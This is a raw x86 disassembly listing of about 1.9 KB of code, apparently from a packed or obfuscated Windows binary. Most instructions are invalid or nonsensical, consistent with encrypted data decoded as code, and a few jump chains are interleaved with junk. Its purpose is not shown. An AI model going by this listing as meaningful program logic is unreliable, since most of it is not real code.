  40a90a:	sub    dh,BYTE PTR [edx+0x3e]
  40a90d:	fwait
  40a90e:	ret    
  40a90f:	jno    0x40a8f4
  40a911:	daa    
  40a912:	inc    ebx
  40a913:	or     BYTE PTR [ebx],al
  40a915:	mov    edx,0x45ee8aaf
  40a91a:	in     eax,dx
  40a91b:	pushf  
  40a91c:	dec    esp
  40a91d:	mov    dl,0xd4
  40a91f:	ja     0x40a97d
  40a921:	or     BYTE PTR [ecx-0x13ba74c8],0x8b
  40a928:	pop    ebp
  40a929:	clc    
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    DWORD PTR [esi-0x63],edi
  40a949:	(bad)  
  40a94a:	mov    edx,0x787883da
  40a94f:	je     0x40a9cf
  40a951:	js     0x40a9cb
  40a953:	mov    edx,0x4aafcb2
  40a958:	mov    DWORD PTR cs:[ebx],esi
  40a95b:	add    eax,0xd029eb38
  40a960:	sub    esi,edx
  40a962:	and    eax,0x7f7947ee
  40a967:	jo     0x40a968
  40a969:	(bad)  
  40a96a:	in     al,0xb6
  40a96c:	fwait
  40a96d:	ja     0x40a9ea
  40a96f:	fwait
  40a970:	iret   
  40a971:	mov    dh,0xfa
  40a973:	xchg   edx,eax
  40a974:	popf   
  40a975:	ins    DWORD PTR es:[edi],dx
  40a976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a977:	imul   ebx,DWORD PTR [eax+esi*8+0x25993006],0xa584554d
  40a982:	dec    edx
  40a983:	push   DWORD PTR [ecx]
  40a985:	fld    QWORD PTR [ebx+0x76]
  40a988:	je     0x40a9d1
  40a98a:	(bad)  
  40a98b:	cmp    DWORD PTR [edi+0x38d9666b],ecx
  40a991:	mov    dh,0x10
  40a993:	mov    ecx,0x148e2be8
  40a998:	or     al,0xcc
  40a99a:	mov    bh,0x7c
  40a99c:	mov    ah,0x4e
  40a99e:	sbb    DWORD PTR [edx-0x3f],0xffffff92
  40a9a2:	xlat   BYTE PTR ds:[ebx]
  40a9a3:	fdivrp st(4),st
  40a9a5:	xchg   ebp,eax
  40a9a6:	sti    
  40a9a7:	jmp    0x5ed1:0xf705be4c
  40a9ae:	outs   dx,BYTE PTR ds:[esi]
  40a9af:	jge    0x40a98e
  40a9b1:	data16 out 0xa,al
  40a9b4:	sub    al,0x4b
  40a9b6:	jecxz  0x40a97d
  40a9b8:	scas   eax,DWORD PTR es:[edi]
  40a9b9:	aam    0xcb
  40a9bb:	jge    0x40a95d
  40a9bd:	(bad)  
  40a9bf:	push   cs
  40a9c0:	inc    eax
  40a9c1:	mov    esp,0x86e013a6
  40a9c6:	call   0xb091:0xbef9df1b
  40a9cd:	jns    0x40a9f8
  40a9cf:	mov    ds:0x148749bd,eax
  40a9d4:	dec    ecx
  40a9d5:	dec    ebp
  40a9d6:	mov    bl,0xf9
  40a9d8:	add    al,0x6f
  40a9da:	leave  
  40a9db:	sub    BYTE PTR [ebp+0x4b],dl
  40a9de:	xchg   ebp,eax
  40a9df:	add    BYTE PTR [edi+0x2542d826],dh
  40a9e5:	sbb    eax,0x16dc8acc
  40a9ea:	imul   ebx,DWORD PTR [esi-0x62caef8f],0xc6f63c98
  40a9f4:	sbb    eax,0x7ac43356
  40a9f9:	mov    dh,0xe5
  40a9fb:	ret    
  40a9fc:	ret    
  40a9fd:	pop    ss
  40a9fe:	mov    ds:0x4b8d8b,al
  40aa03:	jmp    0x40a99d
  40aa05:	push   cs
  40aa06:	cli    
  40aa07:	cmp    DWORD PTR [edx],edx
  40aa09:	test   BYTE PTR [ebx],al
  40aa0b:	(bad)  [eax]
  40aa0d:	add    al,0xf2
  40aa0f:	adc    eax,0x72e1767d
  40aa14:	mov    dl,0x23
  40aa16:	aad    0x81
  40aa18:	and    DWORD PTR [edi],ebp
  40aa1a:	cmp    BYTE PTR [ebx+0x38],bl
  40aa1d:	or     BYTE PTR [ebp-0x14],0xa8
  40aa21:	dec    esi
  40aa22:	or     eax,0xa336ce70
  40aa27:	adc    al,0xd6
  40aa29:	mov    dl,0x8
  40aa2b:	(bad)  
  40aa2c:	call   0xeef9dd7f
  40aa31:	xor    ch,BYTE PTR [ecx-0x1d]
  40aa34:	xchg   eax,ecx
  40aa36:	cwde   
  40aa37:	jno    0x40aaa4
  40aa39:	lods   eax,DWORD PTR ds:[esi]
  40aa3a:	mov    ds:0xedf84ab3,al
  40aa3f:	loop   0x40a9e4
  40aa41:	out    0x83,al
  40aa43:	push   edx
  40aa44:	or     eax,0x304343b2
  40aa49:	push   ebx
  40aa4a:	xlat   BYTE PTR ds:[ebx]
  40aa4b:	and    ecx,edx
  40aa4d:	xchg   BYTE PTR [edx-0x26],cl
  40aa50:	sub    al,0x35
  40aa52:	sahf   
  40aa53:	leave  
  40aa54:	imul   edi,DWORD PTR ss:[edi+0x1e],0x58
  40aa59:	mov    al,ds:0x91abded8
  40aa5e:	and    DWORD PTR [ebx+edi*8],esi
  40aa61:	dec    edi
  40aa62:	int    0xf3
  40aa64:	sub    DWORD PTR ds:0x73d1170c,eax
  40aa6a:	jnp    0x40aae6
  40aa6c:	push   es
  40aa6d:	fs push 0xbb552f5
  40aa73:	pushf  
  40aa74:	dec    edi
  40aa75:	lock dec ebp
  40aa77:	mov    DWORD PTR [eax+ecx*2-0x2e0f3244],eax
  40aa7e:	add    al,0xa5
  40aa80:	mov    ch,ch
  40aa82:	pushf  
  40aa83:	jb     0x40aab8
  40aa85:	lea    eax,[edi]
  40aa87:	popf   
  40aa88:	xchg   ecx,eax
  40aa89:	adc    eax,0xb03858d4
  40aa8e:	sbb    DWORD PTR [ecx+0x596e3afb],eax
  40aa94:	push   0x47
  40aa96:	jnp    0x40aa41
  40aa98:	fwait
  40aa99:	or     al,0xbb
  40aa9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa9c:	call   0xabb:0x9a03c81a
  40aaa3:	xchg   DWORD PTR [eax+0x52],ebp
  40aaa6:	loop   0x40aa6a
  40aaa8:	or     DWORD PTR [edi+0x7efdc7ce],ebp
  40aaae:	bound  ecx,QWORD PTR [esi-0x7329ae40]
  40aab4:	adc    DWORD PTR [esi],ebx
  40aab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aab7:	xchg   esp,eax
  40aab8:	mov    dh,BYTE PTR [edi+0x3a77ee5d]
  40aabe:	cmp    esi,DWORD PTR [esi-0x55]
  40aac1:	lods   eax,DWORD PTR ds:[esi]
  40aac2:	mov    ebx,0x90698d6e
  40aac7:	inc    ecx
  40aac8:	(bad)  
  40aac9:	cmp    cl,bl
  40aacb:	mov    eax,ds:0xe1c286bb
  40aad0:	mov    ah,0x1b
  40aad2:	xchg   esi,eax
  40aad3:	inc    ebx
  40aad4:	inc    esp
  40aad5:	mov    cl,0xd3
  40aad7:	stc    
  40aad8:	dec    ebx
  40aad9:	cdq    
  40aada:	nop    ecx
  40aadd:	rcl    BYTE PTR [ebx+ebx*8],1
  40aae0:	test   al,0xae
  40aae2:	and    eax,0x9ae64838
  40aae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aae8:	pop    esp
  40aae9:	xor    BYTE PTR [edx+0x1e78fb0b],bl
  40aaef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaf0:	jmp    0x815d:0x4f87a7a
  40aaf7:	imul   ebx,DWORD PTR [edi],0x3c
  40aafa:	out    dx,al
  40aafb:	fs sahf 
  40aafd:	out    dx,al
  40aafe:	scas   al,BYTE PTR es:[edi]
  40aaff:	add    al,0x99
  40ab01:	xchg   ebx,eax
  40ab02:	(bad)  
  40ab03:	pop    ecx
  40ab04:	cs (bad) 
  40ab06:	cli    
  40ab07:	add    eax,0x855a1a1c
  40ab0c:	xor    al,BYTE PTR [esi+0xa93d2ca]
  40ab12:	fbstp  TBYTE PTR [esp+eiz*2-0x50a04db5]
  40ab19:	dec    esi
  40ab1a:	idiv   BYTE PTR [esi-0xe]
  40ab1d:	bound  esp,QWORD PTR [ebx-0x2c353658]
  40ab23:	xchg   ecx,eax
  40ab24:	inc    edx
  40ab25:	out    0xe,eax
  40ab27:	and    ecx,DWORD PTR [ecx+0x7da19df5]
  40ab2d:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40ab2f:	in     al,0x90
  40ab31:	push   es
  40ab32:	iret   
  40ab33:	(bad)  
  40ab34:	push   ds
  40ab35:	daa    
  40ab36:	pop    ebp
  40ab37:	jne    0x40ab09
  40ab39:	pop    eax
  40ab3a:	xchg   esp,eax
  40ab3b:	imul   ecx,esi,0x70b7fce2
  40ab41:	leave  
  40ab42:	aad    0x1d
  40ab44:	mov    ebp,0x54d1e99d
  40ab49:	or     al,0xa6
  40ab4b:	xchg   esp,eax
  40ab4c:	push   eax
  40ab4d:	mov    cl,0xec
  40ab4f:	in     al,dx
  40ab50:	mov    DWORD PTR [ecx-0x38],0xfedbcf3d
  40ab57:	sbb    ch,bh
  40ab59:	pop    esi
  40ab5a:	push   cs
  40ab5b:	pop    ebp
  40ab5c:	sti    
  40ab5d:	and    al,0x70
  40ab5f:	push   ss
  40ab60:	ins    DWORD PTR es:[edi],dx
  40ab61:	push   es
  40ab62:	jmp    0x40ab9e
  40ab64:	inc    ebx
  40ab65:	fwait
  40ab66:	sbb    BYTE PTR [ecx-0x52d5a9a8],0x83
  40ab6d:	xchg   esi,eax
  40ab6e:	aaa    
  40ab6f:	dec    edi
  40ab70:	loope  0x40abc0
  40ab72:	mov    ax,ds:0xfefebccf
  40ab78:	jbe    0x40abd1
  40ab7a:	out    0xd4,eax
  40ab7c:	(bad)  
  40ab7d:	mov    ebx,0x9108faa9
  40ab82:	sbb    BYTE PTR [ecx+0x77],0x30
  40ab86:	xor    al,0xe5
  40ab88:	sub    al,0x17
  40ab8a:	pusha  
  40ab8b:	iret   
  40ab8c:	imul   edx,DWORD PTR [ebp+0x12],0x40d51af7
  40ab93:	adc    DWORD PTR [esi-0x2fd9ad9b],ebx
  40ab99:	mov    ecx,0x20f15736
  40ab9e:	xor    DWORD PTR ds:0xcc4aedf1,0x213dd9a3
  40aba8:	sbb    BYTE PTR [ebp-0x9e49691],0xb8
  40abaf:	or     eax,0x76ec52b2
  40abb4:	dec    eax
  40abb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abb6:	push   cs
  40abb7:	mov    eax,ds:0x6e04c037
  40abbc:	adc    ecx,DWORD PTR [esi+0x745c3925]
  40abc2:	add    eax,0xfd4e35e4
  40abc7:	push   ds
  40abc8:	stos   DWORD PTR es:[edi],eax
  40abc9:	sub    BYTE PTR ds:0x114dc012,0x67
  40abd0:	cs in  al,dx
  40abd2:	fiadd  DWORD PTR [esi-0x7830d94a]
  40abd8:	jl     0x40abb8
  40abda:	popf   
  40abdb:	xchg   edi,eax
  40abdc:	fisubr DWORD PTR [ecx+ebx*1+0x6ac8c60c]
  40abe3:	(bad)
  40abe6:	pop    es
  40abe7:	mov    ds:0xadf69bb9,al
  40abec:	jp     0x40ab75
  40abee:	mov    BYTE PTR [edi-0x5d7c7df3],bl
  40abf4:	xor    cl,BYTE PTR [ebp+eax*4-0x6a7fdbc8]
  40abfb:	pop    esi
  40abfc:	adc    BYTE PTR [esi-0x47],dh
  40abff:	mov    al,BYTE PTR [esp+eax*8]
  40ac02:	scas   eax,DWORD PTR es:[edi]
  40ac03:	or     edx,ebp
  40ac05:	xchg   BYTE PTR [ebx],ch
  40ac07:	xchg   edx,eax
  40ac08:	aaa    
  40ac09:	arpl   WORD PTR [ecx+0x12],cx
  40ac0c:	das    
  40ac0d:	fcomp  st(2)
  40ac0f:	ja     0x40ac5c
  40ac11:	pop    es
  40ac12:	rcr    DWORD PTR [ebx],cl
  40ac14:	aad    0x88
  40ac16:	daa    
  40ac17:	xchg   ecx,eax
  40ac18:	iret   
  40ac19:	icebp  
  40ac1a:	mov    ds:0xe60fe652,al
  40ac1f:	mov    BYTE PTR [ebp+0x7ae5feab],bh
  40ac25:	pop    esi
  40ac26:	(bad)  
  40ac28:	(bad)  
  40ac29:	cmp    eax,0xbec70a58
  40ac2e:	out    dx,eax
  40ac2f:	xchg   BYTE PTR [ecx],bh
  40ac31:	ja     0x40abd4
  40ac33:	jbe    0x40ac14
  40ac35:	or     dh,ah
  40ac37:	inc    ebp
  40ac38:	ror    bh,1
  40ac3a:	push   ds
  40ac3b:	mov    ecx,0x3a9ef5e5
  40ac40:	(bad)  
  40ac41:	ret    
  40ac42:	jnp    0x40ac1e
  40ac44:	xor    edx,DWORD PTR [ecx+0x3c]
  40ac47:	mov    ds:0xce45987e,al
  40ac4c:	cld    
  40ac4d:	scas   eax,DWORD PTR es:[edi]
  40ac4e:	inc    ecx
  40ac4f:	xor    ebx,ecx
  40ac51:	xor    edx,edx
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	psubd  mm3,QWORD PTR [esi]
  40ac8e:	mov    esp,0x7880d64a
  40ac93:	js     0x40ad09
  40ac95:	jle    0x40ad0f
  40ac97:	js     0x40ac8e
  40ac99:	(bad)  
  40ac9a:	test   DWORD PTR [esi-0x5aa36e34],eax
  40aca0:	(bad)  
  40aca1:	jmp    0x40ad04
  40aca3:	cld    
  40aca4:	xchg   ebp,eax
  40aca5:	clc    
  40aca6:	fldlg2 
  40aca8:	pop    ss
  40aca9:	cwde   
  40acaa:	retf   0x1e91
  40acad:	arpl   WORD PTR [esi-0x51],dx
  40acb0:	push   ebx
  40acb1:	xchg   esi,eax
  40acb2:	sbb    DWORD PTR [eax-0x2a],0xc6647fb8
  40acb9:	add    al,0x31
  40acbb:	cmp    al,0x19
  40acbd:	or     BYTE PTR [eax+0x1a],dl
  40acc0:	out    dx,eax
  40acc1:	test   BYTE PTR es:[ebp-0x6a897da9],0xa7
  40acc9:	mov    bl,0x91
  40accb:	(bad)  
  40accc:	jge    0x40ac5a
  40acce:	fwait
  40accf:	inc    edx
  40acd0:	jg     0x40acea
  40acd2:	je     0x40ad28
  40acd4:	add    eax,0x2fdfbf3e
  40acd9:	test   DWORD PTR [esi+0x79],ebx
  40acdc:	std    
  40acdd:	jns    0x40ad50
  40acdf:	into   
  40ace0:	bound  ebp,QWORD PTR [esi-0x2e1bbd0d]
  40ace6:	stos   BYTE PTR es:[edi],al
  40ace7:	out    0x1,eax
  40ace9:	sahf   
  40acea:	les    edx,FWORD PTR [edx]
  40acec:	mov    al,0x2c
  40acee:	(bad)  
  40acef:	pop    edx
  40acf0:	inc    ebx
  40acf1:	mov    esi,0xa7607798
  40acf6:	ja     0x40ad4b
  40acf8:	aas    
  40acf9:	hlt    
  40acfa:	cs cdq 
  40acfc:	mov    ch,ch
  40acfe:	add    al,0xd7
  40ad00:	mov    al,0x6c
  40ad02:	in     eax,dx
  40ad03:	shl    esi,cl
  40ad05:	adc    dh,al
  40ad07:	ret    0xa067
  40ad0a:	(bad)  
  40ad0b:	cld    
  40ad0c:	push   0x1f
  40ad0e:	stos   DWORD PTR es:[edi],eax
  40ad0f:	outs   dx,DWORD PTR ss:[si]
  40ad12:	mov    ah,0x18
  40ad14:	xor    ch,ah
  40ad16:	inc    ebx
  40ad17:	inc    edx
  40ad18:	in     eax,0x6c
  40ad1a:	(bad)  
  40ad1b:	in     al,0xe0
  40ad1d:	pop    ebp
  40ad1e:	xchg   BYTE PTR [esi-0x42],al
  40ad21:	clc    
  40ad22:	addr16 loop 0x40ad78
  40ad25:	mov    ch,0xd1
  40ad27:	jbe    0x40ad68
  40ad29:	add    al,0x3a
  40ad2b:	xor    BYTE PTR [ebp+0x66],ch
  40ad2e:	stc    
  40ad2f:	rol    DWORD PTR [ecx-0x21a22d4],cl
  40ad35:	repnz imul DWORD PTR [ebx-0x4da2d83]
  40ad3c:	test   al,0xbd
  40ad3e:	jmp    0x532494df
  40ad43:	loope  0x40adb2
  40ad45:	jae    0x40ad65
  40ad47:	pop    es
  40ad48:	sbb    DWORD PTR [ebp-0x37],edx
  40ad4b:	mov    WORD PTR [eax-0x36],gs
  40ad4e:	jmp    0x2521:0x7b897159
  40ad55:	sar    DWORD PTR [esi],cl
  40ad57:	mov    ah,0x27
  40ad59:	lods   al,BYTE PTR ds:[esi]
  40ad5a:	sbb    edx,edx
  40ad5c:	cld    
  40ad5d:	xlat   BYTE PTR ds:[ebx]
  40ad5e:	aaa    
  40ad5f:	push   esi
  40ad60:	daa    
  40ad61:	ret    0x1d74
  40ad64:	ss dec ecx
  40ad66:	mov    esi,0x6c5aa112
  40ad6b:	icebp  
  40ad6c:	adc    al,0x74
  40ad6e:	aam    0x64
  40ad70:	sub    eax,0xdf78f1c
  40ad75:	ss fdivr st,st(1)
  40ad78:	in     eax,dx
  40ad79:	add    ebx,DWORD PTR [ebx]
  40ad7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad7c:	aam    0xc4
  40ad7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad7f:	into   
  40ad80:	mov    BYTE PTR [edi+0x4a437d6b],ah
  40ad86:	sti    
  40ad87:	stc    
  40ad88:	dec    esi
  40ad89:	fld    QWORD PTR [esi+0x41]
  40ad8c:	jge    0x40ad1d
  40ad8e:	aad    0x96
  40ad90:	data16 jo 0x40ad3b
  40ad93:	jb     0x40adbb
  40ad95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad96:	xor    bl,ah
  40ad98:	jg     0x40ad88
  40ad9a:	ret    
  40ad9b:	jb     0x40ada5
  40ad9d:	sub    eax,DWORD PTR [esi+esi*2]
  40ada0:	mov    ah,0x2d
  40ada2:	mov    cl,0xdf
  40ada4:	and    BYTE PTR [edi],cl
  40ada6:	jne    0x40ad81
  40ada8:	push   ecx
  40ada9:	push   esp
  40adaa:	pop    ds
  40adab:	and    eax,0xd0661f94
  40adb0:	and    DWORD PTR [ebx-0xa],0x58
  40adb4:	ss cmc 
  40adb6:	stos   BYTE PTR es:[edi],al
  40adb7:	push   0xffffffe8
  40adb9:	sbb    edx,esi
  40adbb:	mov    gs:0xeac9ebd9,eax
  40adc1:	jmp    0x40ad57
  40adc3:	inc    ecx
  40adc4:	aas    
  40adc5:	stos   DWORD PTR es:[edi],eax
  40adc6:	cmc    
  40adc7:	add    ah,dl
  40adc9:	cmp    eax,0x3a459f99
  40adce:	arpl   WORD PTR [ebp+0x16],bp
  40add1:	(bad)  
  40add2:	inc    eax
  40add3:	sub    ecx,0xffffffee
  40add6:	dec    ecx
  40add7:	jo     0x40ad60
  40add9:	jb     0x40ad7c
  40addb:	pop    esi
  40addc:	mov    eax,0x7d7310b7
  40ade1:	shl    DWORD PTR [esi-0x5a],0x47
  40ade5:	sub    eax,0xa8e72d
  40adea:	xchg   ecx,eax
  40adeb:	fld    QWORD PTR [eax-0x1d530eed]
  40adf1:	xchg   ecx,eax
  40adf2:	nop
  40adf3:	inc    edi
  40adf4:	push   esi
  40adf5:	xor    BYTE PTR [esi],bl
  40adf7:	es inc ebx
  40adf9:	xchg   DWORD PTR [ebx],esi
  40adfb:	shr    DWORD PTR [ebx-0x34],cl
  40adfe:	add    eax,0x5600d76d
  40ae03:	cmp    edi,DWORD PTR [ecx+0xc0dd1cd]
  40ae09:	inc    esp
  40ae0a:	mov    al,ds:0xaa97140d
  40ae0f:	loope  0x40adbf
  40ae11:	or     DWORD PTR [ecx+0x3f5455da],esi
  40ae17:	les    ebx,FWORD PTR [esi-0x5b48d2a3]
  40ae1d:	(bad)  
  40ae1e:	cmp    al,0x89
  40ae20:	dec    edi
  40ae21:	dec    ecx
  40ae22:	js     0x40ae7a
  40ae24:	es pushf 
  40ae26:	inc    esi
  40ae27:	gs shl ebx,1
  40ae2a:	inc    edi
  40ae2b:	retf   
  40ae2c:	cmp    BYTE PTR [esi+0x2e9a209c],bh
  40ae32:	pop    edx
  40ae33:	inc    eax
  40ae34:	xchg   BYTE PTR [edx+0x4da80373],ch
  40ae3a:	mov    dl,0xe1
  40ae3c:	je     0x40ae94
  40ae3e:	xchg   esp,eax
  40ae3f:	xor    BYTE PTR [ebx+0x9],ch
  40ae42:	push   es
  40ae43:	jmp    0x40ae30
  40ae45:	xor    edx,DWORD PTR [esi-0x172628d4]
  40ae4b:	loope  0x40ae6d
  40ae4d:	shr    edi,0x0
  40ae50:	jns    0x40ae88
  40ae52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae53:	adc    eax,0x453e0f87
  40ae58:	test   DWORD PTR [ebp+0x45f44a9],esp
  40ae5e:	cmc    
  40ae5f:	rcr    BYTE PTR [ebp-0x122c0a9f],1
  40ae65:	(bad)  
  40ae66:	cmp    BYTE PTR [edx+0x5171e450],bh
  40ae6c:	jmp    0x40aed4
  40ae6e:	and    al,0xe1
  40ae70:	jle    0x40ae4a
  40ae72:	mov    eax,ds:0x75562c1
  40ae77:	mov    DWORD PTR [edi-0x5449b79c],eax
  40ae7d:	iret   
  40ae7e:	cs cmp edi,eax
  40ae81:	dec    ecx
  40ae82:	jbe    0x40ae68
  40ae84:	jmp    0xe380:0x55be244d
  40ae8b:	jmp    0x40ae72
  40ae8d:	repnz fs push edx
  40ae90:	xor    ebx,DWORD PTR [ecx]
  40ae92:	and    BYTE PTR [ebp+eax*2+0x7ccd96e7],ch
  40ae99:	(bad)  [eax-0x59]
  40ae9c:	dec    edi
  40ae9d:	out    dx,al
  40ae9e:	jns    0x40aeb3
  40aea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aea1:	repnz and dx,WORD PTR [ebp-0x70]
  40aea6:	mov    ch,0x6b
  40aea8:	retf   
  40aea9:	ret    0x5c93
  40aeac:	xchg   BYTE PTR [eax+0x16],al
  40aeaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aeb0:	inc    edx
  40aeb1:	sti    
  40aeb2:	js     0x40ae55
  40aeb4:	retf   0x7eae
  40aeb7:	add    eax,0x5fab3140
  40aebc:	jl     0x40af08
  40aebe:	xlat   BYTE PTR ds:[ebx]
  40aebf:	mov    edx,0x51831f71
  40aec4:	cmp    ch,BYTE PTR [edx-0xd98b020]
  40aeca:	adc    BYTE PTR [ecx+esi*2-0x2b],dl
  40aece:	bswap  esp
  40aed0:	inc    ecx
  40aed1:	dec    esp
  40aed2:	sub    eax,0x575fabfe
  40aed7:	jo     0x40aeee
  40aed9:	ds push cs
  40aedb:	test   eax,0x5a3feb6b
  40aee0:	xor    edx,DWORD PTR [esi-0x4b]
  40aee3:	iret   
  40aee4:	ins    BYTE PTR es:[edi],dx
  40aee5:	pop    ebx
  40aee6:	xchg   edx,eax
  40aee7:	rol    BYTE PTR [eax+0x45],cl
  40aeea:	scas   eax,DWORD PTR es:[edi]
  40aeeb:	pop    es
  40aeec:	ror    al,1
  40aeee:	jb     0x40aece
  40aef0:	mov    esp,0x6f94d106
  40aef5:	and    BYTE PTR [esi+eax*1],bl
  40aef8:	cli    
  40aef9:	pop    esi
  40aefa:	adc    BYTE PTR [edi+eiz*1],cl
  40aefd:	or     eax,DWORD PTR [ebp-0x31c71a7c]
  40af03:	fsub   QWORD PTR [ebp+0x66bd7f3f]
  40af09:	div    ebx
  40af0b:	adc    BYTE PTR [edi],0x1e
  40af0e:	outs   dx,DWORD PTR ds:[esi]
  40af0f:	jg     0x40af16
  40af11:	pop    ds
  40af12:	ds mov ah,0xa4
  40af15:	fimul  WORD PTR [bx+si-0x2abf]
  40af1a:	call   0x2371:0xf4e95b2d
  40af21:	cmc    
  40af22:	sbb    edi,esi
  40af24:	imul   ecx,DWORD PTR [ebx+0x7b880cab],0x7
  40af2b:	or     eax,eax
  40af2d:	out    dx,eax
  40af2e:	xor    BYTE PTR [eax],bl
  40af30:	fidivr WORD PTR [ebx]
  40af32:	mov    ecx,0xf3a94648
  40af37:	push   es
  40af38:	jnp    0x40af59
  40af3a:	cdq    
  40af3b:	inc    BYTE PTR [edx+0x76]
  40af3e:	push   ss
  40af3f:	jge    0x40af9d
  40af41:	js     0x40aeec
  40af43:	lock adc ecx,ebx
  40af46:	dec    esi
  40af47:	test   BYTE PTR [ecx],cl
  40af49:	cwde   
  40af4a:	fstp   TBYTE PTR [ecx+0x4a207812]
  40af50:	repz cmp DWORD PTR [edi+0x63],esi
  40af54:	cmpxchg BYTE PTR [edi+0x76],al
  40af58:	ds sbb eax,0x325d48de
  40af5e:	int    0x42
  40af60:	jns    0x40afa1
  40af62:	adc    ah,BYTE PTR [edx-0x376398d6]
  40af68:	dec    edi
  40af69:	push   esp
  40af6a:	aad    0x1d
  40af6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af6d:	and    bh,dl
  40af6f:	jmp    0x40afdb
  40af71:	loope  0x40afcf
  40af73:	fimul  WORD PTR ss:[eax+edx*1-0x17]
  40af78:	fwait
  40af79:	push   0x353ebe10
  40af7e:	js     0x40afeb
  40af80:	retf   0x45de
  40af83:	mov    ecx,0x46d61e52
  40af88:	cld    
  40af89:	retf   
  40af8a:	fdiv   DWORD PTR [edi+0x5857a117]
  40af90:	sbb    BYTE PTR [ebp+0x108bedd7],dl
  40af96:	imul   edx,edx,0xf89ea9ed
  40af9c:	mov    DWORD PTR [eax],edx
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	shl    BYTE PTR [edx+eiz*4],0x1c
  40afb6:	rol    BYTE PTR [ebp+0x7e747878],cl
  40afbc:	js     0x40b036
  40afbe:	mov    ecx,0x173b1df2
  40afc3:	std    
  40afc4:	out    0x46,al
  40afc6:	push   ebp
  40afc7:	mov    bl,0x4a
  40afc9:	imul   esp,edi,0x12
  40afcc:	fmul   st,st(1)
  40afce:	retf   0x1bb3
  40afd1:	dec    ebp
  40afd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afd3:	pop    ecx
  40afd4:	and    ch,ch
  40afd6:	out    0xd2,eax
  40afd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afd9:	jnp    0x40afb4
  40afdb:	lea    ebx,ds:0x9911f737
  40afe1:	(bad)  
  40afe2:	push   ebx
  40afe3:	push   ecx
  40afe4:	xchg   edi,eax
  40afe5:	(bad)  
  40afe6:	jecxz  0x40b038
  40afe8:	in     eax,0x9c
  40afea:	dec    esi
  40afeb:	cs or  al,0xf5
  40afee:	mov    ch,0xa2
  40aff0:	(bad)  
  40aff1:	sub    DWORD PTR [ebx-0x2d],esi
  40aff4:	jg     0x40b049
  40aff6:	adc    al,0xeb
  40aff8:	sahf   
  40aff9:	ret    0x1920
  40affc:	fsub   QWORD PTR [ebx+esi*8-0x4a4e4519]
  40b003:	test   eax,edx
  40b005:	or     eax,0xd1e90091
  40b00a:	pushf  
  40b00b:	jns    0x40b031
  40b00d:	clc    
  40b00e:	je     0x40afe0
  40b010:	push   0x4fa00cab
  40b015:	mov    ch,0x2c
  40b017:	push   eax
  40b018:	sub    al,0xa3
  40b01a:	mov    DWORD PTR [edi-0x10738ce4],eax
  40b020:	loopne 0x40b0a1
  40b022:	dec    esi
  40b023:	in     al,0x5e
  40b025:	das    
  40b026:	push   ecx
  40b027:	adc    esp,DWORD PTR [edi-0x4bd45092]
  40b02d:	sbb    dl,ah
  40b02f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b030:	out    0x65,eax
  40b032:	inc    esp
  40b033:	fimul  DWORD PTR [eax-0x44]
  40b036:	shl    BYTE PTR [eax],0x50
  40b039:	hlt    
  40b03a:	cmp    ah,BYTE PTR [ecx-0x78]
  40b03d:	sub    ecx,ebp
  40b03f:	pop    edx
  40b040:	mov    ch,0x98
  40b042:	leave  
  40b043:	sbb    eax,0x758eccc8
  40b048:	(bad)  
  40b04a:	jno    0x40b0a4
  40b04c:	retf   
  40b04d:	dec    esp
  40b04e:	sbb    al,0xbb
  40b050:	sbb    al,ah
  40b052:	(bad)  
  40b053:	daa    
  40b054:	inc    esi
  40b055:	pop    ss
  40b056:	jl     0x40b065
  40b058:	out    0xaa,al
  40b05a:	dec    eax
  40b05b:	call   0xc5ac0dcc
  40b060:	and    ebx,ebp
  40b062:	mov    ds:0x5e168c0e,eax
  40b067:	jbe    0x40b05e
  40b069:	(bad)  
  40b06a:	fadd   QWORD PTR [edx+ecx*4+0x0]
  40b06e:	push   es
  40b06f:	out    dx,eax
  40b070:	jmp    0x40b066
  40b072:	sub    BYTE PTR [ebx-0x24],al
  40b075:	into   
